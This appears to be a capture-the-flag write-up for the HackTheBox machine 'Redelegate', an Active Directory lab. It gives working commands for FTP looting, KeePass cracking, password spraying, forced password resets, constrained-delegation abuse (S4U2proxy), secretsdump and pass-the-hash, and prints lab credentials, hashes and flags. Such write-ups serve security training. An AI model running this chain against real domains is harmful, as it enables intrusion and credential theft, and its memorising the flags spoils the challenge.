---
title: "HTB — Redelegate (Hard Windows AD): FTP KeePass → Constrained Delegation S4U2Proxy"
date: 2026-05-19 12:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, windows, active-directory, keepass, constrained-delegation, s4u2proxy, secretsdump, pass-the-hash, hard]
---

**IP:** 10.129.234.50 | **Difficulty:** Hard | **OS:** Windows Server 2022 DC | **Domain:** redelegate.vl

## Summary

Windows AD machine with a chain starting at anonymous FTP exposing a KeePass database with SQLGuest credentials and an audit file hinting at seasonal passwords. Spraying `Fall2024!` validates `Marie.Curie`. Marie.Curie is in HelpDesk (ForceChangePassword over Helen.Frost). Helen.Frost has `SeEnableDelegationPrivilege` + `GenericAll` over `FS01$`. Constrained delegation attack: change FS01$ password, set `TRUSTED_TO_AUTH_FOR_DELEGATION` + `msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl`, perform S4U2self/proxy impersonating `Ryan.Cooper` (Domain Admin without `NOT_DELEGATED`) → secretsdump → PTH → root.

> **Critical note:** Administrator has the `NOT_DELEGATED` flag — S4U2self returns `KDC_ERR_BADOPTION`. Solution: impersonate `Ryan.Cooper` instead.

| Flag | Hash |
|------|------|
| user.txt | `619144a029fa74f5282739e9d7a8a31e` |
| root.txt | `592a7c8168dd3fe9f424adb361602bc2` |

---

## 1. Reconnaissance

```bash
nmap -sV -sC -T4 -Pn --open 10.129.234.50
echo "10.129.234.50 redelegate.vl dc.redelegate.vl" | sudo tee -a /etc/hosts
```

```
21/tcp   open  ftp    Microsoft ftpd (Anonymous FTP allowed)
88/tcp   open  kerberos-sec
389/tcp  open  ldap   (Domain: redelegate.vl)
1433/tcp open  ms-sql-s
5985/tcp open  http   WinRM
```

---

## 2. Anonymous FTP + KeePass

```bash
ftp 10.129.234.50  # anonymous / ""
mget *
# CyberAudit.txt, Shared.kdbx, TrainingAgenda.txt
```

`TrainingAgenda.txt` mentions the `SeasonYear!` password pattern. Build a seasonal wordlist:

```bash
keepass2john Shared.kdbx > Shared.kdbx.hash
john Shared.kdbx.hash --wordlist=pass.txt
# Fall2024!
```

Credentials extracted: `SQLGuest:zDPBpaF4FywlqIv11vii`

---

## 3. Password Spray → Marie.Curie

```bash
nxc smb 10.129.234.50 -u 'Marie.Curie' -p 'Fall2024!'
# [+] redelegate.vl\Marie.Curie:Fall2024!
```

---

## 4. ForceChangePassword (Marie.Curie → Helen.Frost) + User Flag

Marie.Curie is in the **HelpDesk** group which has ForceChangePassword over Helen.Frost:

```bash
getTGT.py redelegate.vl/marie.curie:'Fall2024!' -dc-ip 10.129.234.50
export KRB5CCNAME=$(pwd)/marie.curie.ccache

bloodyAD -d redelegate.vl -k --host dc.redelegate.vl set password HELEN.FROST 'Password1!'

evil-winrm -i redelegate.vl -u HELEN.FROST -p 'Password1!'
type C:\Users\Helen.Frost\Desktop\user.txt
# 619144a029fa74f5282739e9d7a8a31e
```

---

## 5. Constrained Delegation (Helen.Frost → FS01$ → Ryan.Cooper → Administrator)

Helen.Frost has:
- **SeEnableDelegationPrivilege** — can set delegation flags in AD
- **GenericAll** over `FS01$` — full control of the machine account

### Configure FS01$ as TRUSTED_TO_AUTH_FOR_DELEGATION

```bash
bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl \
  set password FS01$ 'Hackme123!'

# UAC 16781312 = WORKSTATION_TRUST_ACCOUNT | TRUSTED_TO_AUTH_FOR_DELEGATION
bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl \
  set object FS01$ userAccountControl -v 16781312

bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl \
  set object FS01$ msDS-AllowedToDelegateTo -v "cifs/dc.redelegate.vl"
```

### S4U2Proxy — Impersonate Ryan.Cooper

**IMPORTANT:** Administrator has `NOT_DELEGATED` → use `Ryan.Cooper` (Domain Admin without that flag):

```bash
unset KRB5CCNAME

getST.py -spn cifs/dc.redelegate.vl -impersonate Ryan.Cooper \
  -dc-ip 10.129.234.50 \
  -hashes :855609703933ed05aef9c21b64c2a01e \
  'redelegate.vl/FS01$'
# → Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

### secretsdump + Pass-the-Hash

```bash
export KRB5CCNAME=$(pwd)/Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
secretsdump.py -k -no-pass dc.redelegate.vl
# Administrator: ec17f7a2a4d96e177bfd101b94ffc0a7

evil-winrm -i redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
type C:\Users\Administrator\Desktop\root.txt
# 592a7c8168dd3fe9f424adb361602bc2
```

---

## Attack Chain

```
Anonymous FTP → Shared.kdbx (Fall2024!) → SQLGuest
  ↓ Password spray Fall2024!
Marie.Curie → HelpDesk → ForceChangePassword
Helen.Frost → user.txt
  ↓ SeEnableDelegationPrivilege + GenericAll over FS01$
FS01$ (Hackme123!) → TRUSTED_TO_AUTH_FOR_DELEGATION + cifs/dc
  ↓ S4U2proxy (Administrator has NOT_DELEGATED → use Ryan.Cooper)
Ryan.Cooper@cifs/dc → secretsdump
Administrator NTLM → PTH → root.txt
```

---

## Lessons Learned

| Vulnerability | Remediation |
|---------------|-------------|
| Anonymous FTP exposing KeePass database | Disable anonymous FTP; never expose password databases |
| Seasonal passwords (Fall2024!) | Password complexity policy + MFA |
| ForceChangePassword via HelpDesk group | Audit ACLs on privileged groups; least privilege |
| SeEnableDelegationPrivilege + GenericAll on machine account | Remove SeEnableDelegationPrivilege from regular users |
| NOT_DELEGATED doesn't protect if another DA lacks the flag | Mark ALL Domain Admins with NOT_DELEGATED or add to Protected Users |
